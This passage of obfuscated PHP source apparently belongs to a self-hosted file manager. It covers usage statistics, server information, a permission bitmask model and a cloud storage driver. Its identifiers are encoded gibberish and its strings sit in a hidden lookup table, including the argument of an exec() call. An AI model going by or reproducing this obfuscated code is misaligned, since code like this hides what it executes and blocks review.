strtotime(date($Éàâïï[1912])))); $¿ï™ìªˆ = Model($Éàâïï[891])->where($Öãé“’å)->sum($Éàâïï[79]); $¡–Ñ›œ = Model($Éàâïï[891])->where($Öãé“’å)->count($Éàâïï[193]); return array($Éàâïï[824] => $èÃ’éñÌ, $Éàâïï[1905] => $øî—ĞÖì, $Éàâïï[1937] => $èÃ’éñÌ - $øî—ĞÖì, $Éàâïï[1938] => (int) $¿ï™ìªˆ, $Éàâïï[826] => (int) $¦Şı¦Ì¯, $Éàâïï[1939] => (int) $¡–Ñ›œ); } private function optionAccess() { $šŞÆÊ¼Í =& $_SERVER[°‰†òö¯]; return array($šŞÆÊ¼Í[819] => $this->typeLogCnt(), $šŞÆÊ¼Í[110] => $this->typeLogCnt($šŞÆÊ¼Í[110]), $šŞÆÊ¼Í[527] => $this->typeLogCnt($šŞÆÊ¼Í[527]), $šŞÆÊ¼Í[1940] => $this->typeLogCnt($šŞÆÊ¼Í[1940]), $šŞÆÊ¼Í[1941] => $this->typeLogCnt($šŞÆÊ¼Í[1941]), $šŞÆÊ¼Í[669] => $this->typeLogCnt($šŞÆÊ¼Í[12], $šŞÆÊ¼Í[1916])); } private function typeLogCnt($€’áÏ” = '', $³ñ¥¡ƒÌ = "\151\144") { $ªîñ¼¤ =& $_SERVER[°‰†òö¯]; $°à»¢ ‡ = array($ªîñ¼¤[110] => array($ªîñ¼¤[1942], $ªîñ¼¤[1943]), $ªîñ¼¤[527] => array($ªîñ¼¤[1944], $ªîñ¼¤[1945]), $ªîñ¼¤[1940] => array($ªîñ¼¤[1946], $ªîñ¼¤[1947], $ªîñ¼¤[1948]), $ªîñ¼¤[1941] => array($ªîñ¼¤[1949], $ªîñ¼¤[1950]), $ªîñ¼¤[1951] => array($ªîñ¼¤[1952], $ªîñ¼¤[1953], $ªîñ¼¤[1954])); $–‹ßÛóŞ = strtotime(date($ªîñ¼¤[1912])); $ñ‡æÖ¬ = array($ªîñ¼¤[233] => array($ªîñ¼¤[1089], $–‹ßÛóŞ)); if ($€’áÏ”) { $ñ‡æÖ¬[$ªîñ¼¤[33]] = array($ªîñ¼¤[7], $°à»¢ ‡[$€’áÏ”]); } $ÓÉ§ì»¬ = Model($ªîñ¼¤[1915])->where($ñ‡æÖ¬)->count($³ñ¥¡ƒÌ); return (int) $ÓÉ§ì»¬; } private function optionServer() { $üàãËº =& $_SERVER[°‰†òö¯]; $ÁÏßğõ° = $this->diskDriver(); $Áˆ¦Ÿ‰ = KodIO::defaultDriver(); $àÏ°ëÀÀ = array($üàãËº[884] => $Áˆ¦Ÿ‰[$üàãËº[477]]); $‡İ—Éâ¯ = Model($üàãËº[548])->where($àÏ°ëÀÀ)->sum($üàãËº[79]); $îÒåÖ²— = explode($üàãËº[53], $_SERVER[$üàãËº[147]]); $Å°Ÿ¹â› = $îÒåÖ²—[0]; $²·”Ë® = $GLOBALS[$üàãËº[6]][$üàãËº[21]]; $ÛÏÒ’ä¿ = $²·”Ë®[$üàãËº[1051]]; if ($ÛÏÒ’ä¿ == $üàãËº[1039]) { $«˜ÊŠÚä = explode($üàãËº[1366], $²·”Ë®[$üàãËº[1050]]); $ÛÏÒ’ä¿ = $«˜ÊŠÚä[0]; } if ($ÛÏÒ’ä¿ == $üàãËº[985] || $ÛÏÒ’ä¿ == $üàãËº[869]) { $ËŒ¡¡èÜ = Model()->db()->query($üàãËº[1955]); $Ç®åÁ±ƒ = $ËŒ¡¡èÜ[0] && isset($ËŒ¡¡èÜ[0][$üàãËº[1658]]) ? $ËŒ¡¡èÜ[0][$üàãËº[1658]] : 0; $ÛÏÒ’ä¿ = $üàãËº[1956] . ($Ç®åÁ±ƒ ? $üàãËº[8] . $Ç®åÁ±ƒ : $üàãËº[12]); } $€€§²æŞ = $GLOBALS[$üàãËº[6]][$üàãËº[426]][$üàãËº[893]]; return array($üàãËº[1957] => $ÁÏßğõ° ? $ÁÏßğõ°[$üàãËº[1958]] : 0, $üàãËº[1959] => $ÁÏßğõ° ? $ÁÏßğõ°[$üàãËº[1960]] : 0, $üàãËº[1961] => (int) $Áˆ¦Ÿ‰[$üàãËº[1958]] * 1024 * 1024 * 1024, $üàãËº[1962] => (int) $‡İ—Éâ¯, $üàãËº[1963] => ucfirst($Å°Ÿ¹â›), $üàãËº[1964] => $üàãËº[1965] . PHP_VERSION, $üàãËº[1966] => phpBuild64() ? 64 : 32, $üàãËº[818] => str_replace($üàãËº[1207], $üàãËº[1067], $ÛÏÒ’ä¿), $üàãËº[426] => ucfirst($€€§²æŞ), $üàãËº[32] => $_SERVER[$üàãËº[1967]]); } private function diskDriver() { $è¡­âØ­ =& $_SERVER[°‰†òö¯]; $Óƒ‡§« = $è¡­âØ­[8]; $µ¨ïİÙî = $GLOBALS[$è¡­âØ­[6]][$è¡­âØ­[1383]] == $è¡­âØ­[1384]; if ($µ¨ïİÙî) { $Óƒ‡§« = $è¡­âØ­[1968]; if (function_exists($è¡­âØ­[1969])) { exec($è¡­âØ­[1970], $¼ù†íé™); $Óƒ‡§« = $¼ù†íé™[1] . $è¡­âØ­[8]; } } if (!file_exists($Óƒ‡§«)) { return; } if (!function_exists($è¡­âØ­[1971])) { return; } $°ô‡¿ş¡ = @disk_total_space($Óƒ‡§«); $Íß´Ò“Ç = $°ô‡¿ş¡ - @disk_free_space($Óƒ‡§«); return array($è¡­âØ­[1958] => $°ô‡¿ş¡, $è¡­âØ­[1960] => $Íß´Ò“Ç); } public function fileChart($ÂçßÇ®Ë) { $‘™Š™ =& $_SERVER[°‰†òö¯]; if (isset($ÂçßÇ®Ë[$‘™Š™[1771]])) { return Model($‘™Š™[891])->userFileTypeProfile($ÂçßÇ®Ë[$‘™Š™[1771]]); } if (isset($ÂçßÇ®Ë[$‘™Š™[1972]])) { return Model($‘™Š™[891])->groupFileTypeProfile($ÂçßÇ®Ë[$‘™Š™[1972]]); } $Ğà¾à’ = $this->sourceSize(); $­Ş«ÊÏ = array($‘™Š™[192] => 0, $‘™Š™[190] => 1); $ò­äôû = Model($‘™Š™[891])->where($­Ş«ÊÏ)->sum($‘™Š™[79]); $­Ş«ÊÏ[$‘™Š™[190]] = 2; $çí³ùòç = Model($‘™Š™[891])->where($­Ş«ÊÏ)->sum($‘™Š™[79]); return array($‘™Š™[824] => $Ğà¾à’[$‘™Š™[79]], $‘™Š™[1905] => $Ğà¾à’[$‘™Š™[1905]], $‘™Š™[1906] => (int) $ò­äôû, $‘™Š™[1907] => (int) $çí³ùòç); } private function sourceSize() { $—„…ÖÉ¿ =& $_SERVER[°‰†òö¯]; $Ç¬äÜ÷› = Model($—„…ÖÉ¿[891])->where(array($—„…ÖÉ¿[487] => 0))->sum($—„…ÖÉ¿[79]); $ó¿áå´‹ = Model($—„…ÖÉ¿[548])->sum($—„…ÖÉ¿[79]); if ($ó¿áå´‹ > $Ç¬äÜ÷›) { $ó¿áå´‹ = $Ç¬äÜ÷›; } return array($—„…ÖÉ¿[79] => (int) $Ç¬äÜ÷›, $—„…ÖÉ¿[1905] => (int) $ó¿áå´‹); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $È‹¼°³™ =& $_SERVER[°‰†òö¯]; $ÈôßÇ¾ò = array(array($È‹¼°³™[496] => LNG($È‹¼°³™[1973]), $È‹¼°³™[1974] => $È‹¼°³™[1975], $È‹¼°³™[1976] => 1, $È‹¼°³™[1977] => 1, $È‹¼°³™[1978] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($È‹¼°³™[496] => LNG($È‹¼°³™[1979]), $È‹¼°³™[1974] => $È‹¼°³™[1980], $È‹¼°³™[1976] => 2, $È‹¼°³™[1977] => 1, $È‹¼°³™[1978] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($È‹¼°³™[496] => LNG($È‹¼°³™[1981]), $È‹¼°³™[1974] => $È‹¼°³™[1982], $È‹¼°³™[1976] => 3, $È‹¼°³™[1977] => 1, $È‹¼°³™[1978] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($È‹¼°³™[496] => LNG($È‹¼°³™[1983]), $È‹¼°³™[1974] => $È‹¼°³™[1984], $È‹¼°³™[1976] => 4, $È‹¼°³™[1977] => 1, $È‹¼°³™[1978] => self::AUTH_SHOW | self::AUTH_VIEW), array($È‹¼°³™[496] => LNG($È‹¼°³™[1985]), $È‹¼°³™[1974] => $È‹¼°³™[1986], $È‹¼°³™[1976] => 5, $È‹¼°³™[1977] => 1, $È‹¼°³™[1978] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($È‹¼°³™[496] => LNG($È‹¼°³™[1987]), $È‹¼°³™[1974] => $È‹¼°³™[1988], $È‹¼°³™[1976] => 6, $È‹¼°³™[1977] => 1, $È‹¼°³™[1978] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($È‹¼°³™[496] => LNG($È‹¼°³™[1989]), $È‹¼°³™[1974] => $È‹¼°³™[1990], $È‹¼°³™[1976] => 7, $È‹¼°³™[1977] => 1, $È‹¼°³™[1978] => 0)); return $ÈôßÇ¾ò; } public static function authCheck($ûãóÖ”£, $µ¯Òœ¦“) { $££Ş«ñÑ =& $_SERVER[°‰†òö¯]; $ûãóÖ”£ = intval($ûãóÖ”£); if (KodUser::isRoot() && $GLOBALS[$££Ş«ñÑ[6]][$££Ş«ñÑ[1991]]) { return !0; } if ($ûãóÖ”£ <= 0) { return !1; } if (($ûãóÖ”£ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ûãóÖ”£ & $µ¯Òœ¦“); } public static function authCheckShow($“……åÏì) { return self::authCheck($“……åÏì, self::AUTH_SHOW); } public static function authCheckView($´¦ş©ò‡) { return self::authCheck($´¦ş©ò‡, self::AUTH_VIEW); } public static function authCheckDownload($¡ƒ§Œ–¹) { return self::authCheck($¡ƒ§Œ–¹, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ üÂ­±¾) { return self::authCheck($ üÂ­±¾, self::AUTH_UPLOAD); } public static function authCheckEdit($…ÒÜ¿š­) { return self::authCheck($…ÒÜ¿š­, self::AUTH_EDIT); } public static function authCheckRemove($¹ã·º¦—) { return self::authCheck($¹ã·º¦—, self::AUTH_REMOVE); } public static function authCheckShare($ª«›àÖ©) { return self::authCheck($ª«›àÖ©, self::AUTH_SHARE); } public static function authCheckComment($ĞìáŸ™ú) { return self::authCheck($ĞìáŸ™ú, self::AUTH_COMMENT); } public static function authCheckEvent($¹ìÏ…Ô„) { return self::authCheck($¹ìÏ…Ô„, self::AUTH_EVENT); } public static function authCheckRoot($“Ù“•â½) { return self::authCheck($“Ù“•â½, self::AUTH_ROOT); } public static function authCheckAction($û–æášµ, $¢òè¼Ğ·) { $ˆƒ…çãƒ =& $_SERVER[°‰†òö¯]; $éü‰áãÄ = array($ˆƒ…çãƒ[1992] => self::AUTH_VIEW, $ˆƒ…çãƒ[1277] => self::AUTH_DOWNLOAD, $ˆƒ…çãƒ[110] => self::AUTH_UPLOAD, $ˆƒ…çãƒ[1941] => self::AUTH_EDIT, $ˆƒ…çãƒ[1940] => self::AUTH_REMOVE, $ˆƒ…çãƒ[1951] => self::AUTH_SHARE, $ˆƒ…çãƒ[431] => self::AUTH_COMMENT, $ˆƒ…çãƒ[1758] => self::AUTH_EVENT, $ˆƒ…çãƒ[1993] => self::AUTH_ROOT); if (!isset($éü‰áãÄ[$¢òè¼Ğ·])) { return; } $™•€ÖåØ = $éü‰áãÄ[$¢òè¼Ğ·]; $û–æášµ = intval($û–æášµ); if ($û–æášµ <= 0) { return !1; } if (($û–æášµ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($û–æášµ & $™•€ÖåØ); } public static function authDisable($ë×ÜÇÒ, $ı¡¯¢ä) { if (intval($ë×ÜÇÒ) <= 0) { return 0; } return intval($ë×ÜÇÒ) & ~$ı¡¯¢ä; } public $optionType = "\123\171\163\x74\145\x6d\x2e\163\x6f\165\x72\x63\145\x41\165\x74\x68\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x61\165\164\150", "\x6c\141\x62\145\x6c", "\x64\x69\x73\x70\x6c\141\171", "\163\x79\163\164\145\155", "\x73\x6f\162\x74"); public function initData() { $éï…û¸ = $this->authDefault(); foreach ($éï…û¸ as $ğéÎØ‹ñ) { $this->add($ğéÎØ‹ñ); } } public function findAuth($ÛñõÃµ§, $‚æ±¯Õƒ) { $¡§‹šŸÀ =& $_SERVER[°‰†òö¯]; $Ø°Ìßß´ = parent::listData(); foreach ($Ø°Ìßß´ as $ï›ˆ§²) { $Ç¤£×óù = intval($ï›ˆ§²[$¡§‹šŸÀ[489]]); if ($Ç¤£×óù <= 0 || $ï›ˆ§²[$¡§‹šŸÀ[1994]] == 0) { continue; } if (($Ç¤£×óù & $ÛñõÃµ§) != $ÛñõÃµ§) { continue; } if (($Ç¤£×óù & $‚æ±¯Õƒ) != 0) { continue; } return $ï›ˆ§²[$¡§‹šŸÀ[477]]; } return !1; } public function findAuthMax($áòÜĞè°, $ó»£²Ò«) { $•úÛöŒ =& $_SERVER[°‰†òö¯]; $îäßä½â = !1; $„¬½üŸÀ = parent::listData(); foreach ($„¬½üŸÀ as $ÈœÑ³ã©) { $Êšš§Ù = intval($ÈœÑ³ã©[$•úÛöŒ[489]]); if ($Êšš§Ù <= 0 || $ÈœÑ³ã©[$•úÛöŒ[1994]] == 0) { continue; } if (($Êšš§Ù & $áòÜĞè°) != $áòÜĞè°) { continue; } if (($Êšš§Ù & $ó»£²Ò«) != 0) { continue; } if (!$îäßä½â) { $îäßä½â = $ÈœÑ³ã©; continue; } if (intval($îäßä½â[$•úÛöŒ[489]]) < $Êšš§Ù) { $îäßä½â = $ÈœÑ³ã©; } } return $îäßä½â ? $îäßä½â[$•úÛöŒ[477]] : !1; } public function findAuthReadOnly() { $ÕšæÛÉ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ü½…Îƒ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ÕšæÛÉ, $ü½…Îƒ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $„¸İ =& $_SERVER[°‰†òö¯]; $Ãª£Ìš¬ = parent::listData(); $›Ï§˜·“ = !1; foreach ($Ãª£Ìš¬ as $ıŞåŒç–) { if ($ıŞåŒç–[$„¸İ[489]] <= 0 || $ıŞåŒç–[$„¸İ[1994]] == $„¸İ[230]) { continue; } if (!$›Ï§˜·“) { $›Ï§˜·“ = $ıŞåŒç–; continue; } if ($›Ï§˜·“[$„¸İ[489]] > $ıŞåŒç–[$„¸İ[489]]) { $›Ï§˜·“ = $ıŞåŒç–; } } return $›Ï§˜·“ ? $›Ï§˜·“[$„¸İ[477]] : $„¸İ[12]; } public function listData($îõŒ½†Ì = false, $±ÑáõÔê = "\163\157\x72\x74", $úß†´®¶ = false) { return parent::listData($îõŒ½†Ì, $±ÑáõÔê, $úß†´®¶); } public function update($éàƒ×¥, $Ó½¦ÛåË) { $ê›¹È”¶ =& $_SERVER[°‰†òö¯]; $°®ÙûÑ³ = parent::listData($éàƒ×¥); $‘ĞÇ¿ëŒ = $this->findByName($Ó½¦ÛåË[$ê›¹È”¶[32]]); if (!$°®ÙûÑ³ || $‘ĞÇ¿ëŒ && $‘ĞÇ¿ëŒ[$ê›¹È”¶[477]] != $°®ÙûÑ³[$ê›¹È”¶[477]]) { return !1; } $this->filterAuth($Ó½¦ÛåË[$ê›¹È”¶[489]]); return parent::update($éàƒ×¥, $Ó½¦ÛåË); } public function remove($Ø¶ÂÃª«) { $»óŞú‘ = parent::listData($Ø¶ÂÃª«); if (!$»óŞú‘ || $»óŞú‘[$_SERVER[°‰†òö¯][191]]) { return !1; } return parent::remove($Ø¶ÂÃª«); } public function add($óÕóß”· = array()) { $ÌË­©Ú =& $_SERVER[°‰†òö¯]; if ($this->findByName($óÕóß”·[$ÌË­©Ú[32]])) { return !1; } $ÌÑ¨¹şï = array($ÌË­©Ú[32] => $ÌË­©Ú[12], $ÌË­©Ú[489] => 1, $ÌË­©Ú[1995] => $ÌË­©Ú[1982], $ÌË­©Ú[1994] => 1, $ÌË­©Ú[191] => 0, $ÌË­©Ú[1996] => 0); $óÕóß”· = array_merge($ÌÑ¨¹şï, $óÕóß”·); $óÕóß”·[$ÌË­©Ú[1996]] = $this->getSort(); $this->filterAuth($óÕóß”·[$ÌË­©Ú[489]]); return parent::insert($óÕóß”·); } private function getSort() { $Ááæµè» =& $_SERVER[°‰†òö¯]; $ˆÏ‰¨šˆ = parent::listData(); $™ŞÄ—à = array_to_keyvalue($ˆÏ‰¨šˆ, $Ááæµè»[12], $Ááæµè»[1996]); return empty($™ŞÄ—à) ? 0 : max($™ŞÄ—à) + 1; } private function filterAuth(&$¹¼•³é£) { if (!$¹¼•³é£) { return; } $‹Û­Ö = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¸Û¼µñ = array(); foreach ($‹Û­Ö as $ÌÃÀ€¶) { if ($¹¼•³é£ & $ÌÃÀ€¶) { $¸Û¼µñ[] = $ÌÃÀ€¶; } } if (in_array(self::AUTH_ROOT, $¸Û¼µñ)) { $¹¼•³é£ = array_sum($‹Û­Ö); return; } $óŒäå¸ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¸Û¼µñ as $ÌÃÀ€¶) { if (isset($óŒäå¸[$ÌÃÀ€¶])) { $¸Û¼µñ = array_merge($¸Û¼µñ, $óŒäå¸[$ÌÃÀ€¶]); } } $¸Û¼µñ[] = self::AUTH_SHOW; $¹¼•³é£ = array_sum(array_unique($¸Û¼µñ)); } public function sort($Ïø·Ù—, $‹·Üë»«) { return parent::update($Ïø·Ù—, $‹·Üë»«); } } goto C‚Œ˜÷Á¶Í; CùÍ–¬ÀÙ¦: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\x3a\57\57\166\x30\x2e\x61\160\151\56\165\160\171\165\156\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÕØş¢Æ) { parent::__construct(); $this->_init($ÕØş¢Æ); } public function _init($åÓ„‹üø) { $Û¹âãı =& $_SERVER[°‰†òö¯]; foreach ($åÓ„‹üø as $¥’ãÅƒò => $ƒÃòØ¤æ) { if (isset($this->{$¥’ãÅƒò})) { $this->{$¥’ãÅƒò} = $ƒÃòØ¤æ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Û¹âãı[1544] . LNG($Û¹âãı[1463])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¥®àáÍØ, $°•¤ÜÛŞ = "\x47\105\124") { $ŸÅÈ¾İ° =& $_SERVER[°‰†òö¯]; $—Ü·¯Çö = gmdate($ŸÅÈ¾İ°[1492]); $ÙÂ¡¿ìÅ = base64_encode(hash_hmac($ŸÅÈ¾İ°[1545], "{$°•¤ÜÛŞ}\46{$¥®àáÍØ}\46{$—Ü·¯Çö}", md5("{$this->userpass}"), !0)); $¿ÖöğÖÑ = array("\101\x75\164\x68\x6f\162\x69\x7a\141\164\x69\157\x6e\72\125\120\x59\x55\x4e\x20{$this->username}\72{$ÙÂ¡¿ìÅ}", "\104\x61\x74\x65\72{$—Ü·¯Çö}"); return $¿ÖöğÖÑ; } public function ussRequest($ÆÂÇ ×, $éîà¶´ç = "\107\105\124", $È¾İñ¢† = false, $èÔöóªé = false, $„ìšé˜Æ = false) { $ÓÜñÏş =& $_SERVER[°‰†òö¯]; $ÆÂÇ × = trim($ÆÂÇ ×, $ÓÜñÏş[8]); $ä·Ñúø² = "\57{$this->bucket}\x2f" . rawurlencode($ÆÂÇ ×); $ø‹¢â¶û = $this->ussHeaders($ä·Ñúø², $éîà¶´ç); if ($èÔöóªé) { $ø‹¢â¶û = array_merge($ø‹¢â¶û, $èÔöóªé); } $¬–¯‹ëá = url_request($this->endpoint . $ä·Ñúø², $éîà¶´ç, $È¾İñ¢†, $ø‹¢â¶û, $„ìšé˜Æ); if (!$¬–¯‹ëá) { $¯Ä¢Ö‚ = LNG($ÓÜñÏş[1546]); $this->writeLog($¯Ä¢Ö‚); return array($ÓÜñÏş[1295] => !1, $ÓÜñÏş[1285] => $¯Ä¢Ö‚); } if (strtolower($éîà¶´ç) == $ÓÜñÏş[229] || in_array($¬–¯‹ëá[$ÓÜñÏş[1295]], array($ÓÜñÏş[263], $ÓÜñÏş[1547]))) { $È¾İñ¢† = $¬–¯‹ëá[$ÓÜñÏş[1548]]; if (!$¬–¯‹ëá[$ÓÜñÏş[811]]) { $È¾İñ¢† = isset($È¾İñ¢†[0]) ? $È¾İñ¢†[0] : $ÓÜñÏş[12]; } } else { $È¾İñ¢† = json_decode($¬–¯‹ëá[$ÓÜñÏş[1285]], !0); if (!$È¾İñ¢†) { $È¾İñ¢† = $¬–¯‹ëá[$ÓÜñÏş[1285]]; } else { if (!$¬–¯‹ëá[$ÓÜñÏş[811]] && isset($È¾İñ¢†[$ÓÜñÏş[1549]])) { $È¾İñ¢† = $È¾İñ¢†[$ÓÜñÏş[1549]]; } } } if (!$¬–¯‹ëá[$ÓÜñÏş[811]]) { $this->writeLog($this->__errorMessage($È¾İñ¢†)); } return array($ÓÜñÏş[1295] => $¬–¯‹ëá[$ÓÜñÏş[811]], $ÓÜñÏş[1285] => $È¾İñ¢†); } private function __errorMessage($¤ì‡êÑŠ) { $†ÃËÏŸ =& $_SERVER[°‰†òö¯]; if (!$¤ì‡êÑŠ) { return $†ÃËÏŸ[12]; } static $‹¯®şš’ = null; if (!$‹¯®şš’) { $‹¯®şš’ = I18n::getType(); } if ($‹¯®şš’ != $†ÃËÏŸ[1502]) { return $¤ì‡êÑŠ; } $ôó«”­‚ = array($†ÃËÏŸ[1550] => $†ÃËÏŸ[1551], $†ÃËÏŸ[1552] => $†ÃËÏŸ[1553], $†ÃËÏŸ[1554] => $†ÃËÏŸ[1553], $†ÃËÏŸ[1555] => $†ÃËÏŸ[1556], $†ÃËÏŸ[1557] => $†ÃËÏŸ[1558], $†ÃËÏŸ[1559] => $†ÃËÏŸ[1560], $†ÃËÏŸ[1561] => $†ÃËÏŸ[1562]); return isset($ôó«”­‚[$¤ì‡êÑŠ]) ? $ôó«”­‚[$¤ì‡êÑŠ] : $¤ì‡êÑŠ; } public function mkfile($»èŞµşò, $­”Š°·Á = '', $úêì×»à = REPEAT_RENAME) { if ($this->setContent($»èŞµşò, $­”Š°·Á)) { return $this->getPathOuter($»èŞµşò); } return !1; } public function mkdir($‘…À›Êª, $Ğİ®Äó = REPEAT_SKIP) { $œ¯ÉÈÊ˜ =& $_SERVER[°‰†òö¯]; $¼‡ª¤¿¶ = trim($‘…À›Êª, $œ¯ÉÈÊ˜[8]); if ($this->_isFolder($¼‡ª¤¿¶)) { return $this->getPathOuter($¼‡ª¤¿¶); } $³Ëªï¾Õ = array($œ¯ÉÈÊ˜[1563]); $“æ²ÌÆĞ = $this->ussRequest($¼‡ª¤¿¶, $œ¯ÉÈÊ˜[290], !1, $³Ëªï¾Õ); return $“æ²ÌÆĞ[$œ¯ÉÈÊ˜[1295]] ? $this->getPathOuter($¼‡ª¤¿¶) : !1; } public function copyFile($ØŠË¾Ï, $çè™áÚ) { $ä›÷¦«‘ =& $_SERVER[°‰†òö¯]; $‚ß¿îË = array($ä›÷¦«‘[1564] . "\x2f{$this->bucket}\x2f{$ØŠË¾Ï}", $ä›÷¦«‘[1565]); $å¯ÁÌ¬ = $this->ussRequest($çè™áÚ, $ä›÷¦«‘[255], !1, $‚ß¿îË); return $å¯ÁÌ¬[$ä›÷¦«‘[1295]] ? !0 : $this->getPathOuter($çè™áÚ); } public function moveFile($×¸ìêò, $Ö¥Æ»ˆ–) { $øóÄ¯‚á =& $_SERVER[°‰†òö¯]; $—É½éßÙ = array($øóÄ¯‚á[1566] . "\57{$this->bucket}\x2f{$×¸ìêò}", $øóÄ¯‚á[1565]); $ø’ÔÑ‡Ö = $this->ussRequest($Ö¥Æ»ˆ–, $øóÄ¯‚á[255], !1, $—É½éßÙ); return $ø’ÔÑ‡Ö[$øóÄ¯‚á[1295]] ? !0 : $this->getPathOuter($Ö¥Æ»ˆ–); } public function delFile($Ë½Ûê‘) { $¸°š¸‚Ö =& $_SERVER[°‰†òö¯]; $ÈÔøİÏ = $this->ussRequest($Ë½Ûê‘, $¸°š¸‚Ö[1567]); return $ÈÔøİÏ[$¸°š¸‚Ö[1295]] ? !0 : !1; } public function delFolder($˜¸Ÿ°ûî) { $äû°¬üô =& $_SERVER[°‰†òö¯]; if (!$this->exist($˜¸Ÿ°ûî)) { return !0; } $this->listItemCache = !1; $¨·ùÎâŸ = $ë¾ÜÍâ– = array(); $this->fileList($˜¸Ÿ°ûî, $¨·ùÎâŸ, $ë¾ÜÍâ–, !0); $this->listItemCache = !0; foreach ($ë¾ÜÍâ– as $Û¾æ‘›Å) { $¨şÄšöÆ = $this->ussRequest($Û¾æ‘›Å[$äû°¬üô[32]], $äû°¬üô[1567]); if (!$¨şÄšöÆ[$äû°¬üô[1295]]) { return !1; } } usort($¨·ùÎâŸ, function ($ùƒÂŸö, $‘Ó‚Óñ) { $õŞîÙ¬ =& $_SERVER[°‰†òö¯]; return substr_count($‘Ó‚Óñ, $õŞîÙ¬[8]) - substr_count($ùƒÂŸö, $õŞîÙ¬[8]); }); foreach ($¨·ùÎâŸ as $†åğğ±ò) { $¨şÄšöÆ = $this->ussRequest($†åğğ±ò, $äû°¬üô[1567]); if (!$¨şÄšöÆ[$äû°¬üô[1295]]) { return !1; } } $¨şÄšöÆ = $this->ussRequest($˜¸Ÿ°ûî, $äû°¬üô[1567]); return $¨şÄšöÆ[$äû°¬üô[1295]]; } public function rename($Î›öÀ§‹, $£å£Áâë) { if ($this->isFile($Î›öÀ§‹)) { $£å£Áâë = get_path_father($Î›öÀ§‹) . $£å£Áâë; return $this->moveFile($Î›öÀ§‹, $£å£Áâë); } return $this->renameObject($Î›öÀ§‹, $£å£Áâë); } public function fileInfo($Ñƒ§ç…§, $­Ê“³ğ = false, $ËıÛÍª = array()) { $Ã®¨İ =& $_SERVER[°‰†òö¯]; $å”†ñ²” = array($Ã®¨İ[32] => $this->pathThis($Ñƒ§ç…§), $Ã®¨İ[87] => $this->getPathOuter($Ã®¨İ[8] . $Ñƒ§ç…§), $Ã®¨İ[33] => $Ã®¨İ[232], $Ã®¨İ[79] => isset($ËıÛÍª[$Ã®¨İ[79]]) ? $ËıÛÍª[$Ã®¨İ[79]] : 0, $Ã®¨İ[169] => $this->ext($Ñƒ§ç…§)); if ($­Ê“³ğ) { return $å”†ñ²”; } $å”†ñ²”[$Ã®¨İ[233]] = $å”†ñ²”[$Ã®¨İ[88]] = 0; $å”†ñ²”[$Ã®¨İ[234]] = $å”†ñ²”[$Ã®¨İ[235]] = !0; if (empty($ËıÛÍª)) { $ËıÛÍª = $this->objectMeta($Ñƒ§ç…§); if (!$ËıÛÍª) { return $å”†ñ²”; } } $å”†ñ²”[$Ã®¨İ[233]] = intval($ËıÛÍª[$Ã®¨İ[1568]]); $å”†ñ²”[$Ã®¨İ[88]] = intval($ËıÛÍª[$Ã®¨İ[1569]]); $å”†ñ²”[$Ã®¨İ[79]] = $ËıÛÍª[$Ã®¨İ[79]]; return $å”†ñ²”; } public function folderInfo($¨ªğ›ö, $¾ığ¨ê = false) { $æ¶„˜³… =& $_SERVER[°‰†òö¯]; $Èõë­… = array($æ¶„˜³…[32] => $this->pathThis($¨ªğ›ö), $æ¶„˜³…[87] => $this->getPathOuter($æ¶„˜³…[8] . $¨ªğ›ö), $æ¶„˜³…[33] => $æ¶„˜³…[78]); if ($¾ığ¨ê) { return $Èõë­…; } $Èõë­…[$æ¶„˜³…[233]] = $Èõë­…[$æ¶„˜³…[88]] = 0; $Èõë­…[$æ¶„˜³…[234]] = $Èõë­…[$æ¶„˜³…[235]] = !0; if (empty($¦º‰£ê‰)) { $¦º‰£ê‰ = $this->objectMeta($¨ªğ›ö); if 